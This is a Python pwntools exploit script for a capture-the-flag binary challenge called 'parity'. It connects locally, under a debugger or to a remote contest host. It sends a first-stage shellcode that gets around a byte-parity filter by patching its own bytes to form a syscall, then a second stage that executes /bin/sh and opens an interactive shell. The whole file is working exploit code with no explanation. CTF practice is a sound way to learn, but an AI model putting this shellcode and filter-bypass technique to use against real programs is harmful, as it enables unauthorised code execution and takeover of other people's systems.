from pwn import *
elf = ELF("parity")
context.log_level = "debug"
context.arch = 'x86_64'

ip,port = "challs.actf.co", 31226

if len(sys.argv) > 1 and sys.argv[1] == "-gdb":
    r = gdb.debug(elf.path)
elif len(sys.argv) > 1 and sys.argv[1] == "-r":
    r = remote(ip, port)
else:
    r = process(elf.path)

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()

#read
#rax = 0
#rdx = buf addr

assembly1 = asm("""
    push rdx
    pop rdi
    mov byte ptr [rdi+22],0x5
    xor rdx, rdx
    pop rdi
    push rdx
    pop rdi
    mov dl, 51
    nop
    .byte 0xeb
    .byte 0x04
    .byte 0x01
    .byte 0x02
    .byte 0x01
    .byte 0x02
    .byte 0x0f
    .byte 0x04
    push   rcx
    push   rsi
    push   rcx
    xor    rsi,rsi
    pop r10
    ret
    """)

sa(">",assembly1)

assembly = asm("""
    xor rax, rax
    push 59
    pop rax
    mov     rbx, 0x0068732f6e69622f
    push    rbx
    mov     rdi, rsp
    xor rdx, rdx
    syscall
    """)

s(assembly)
r.interactive()
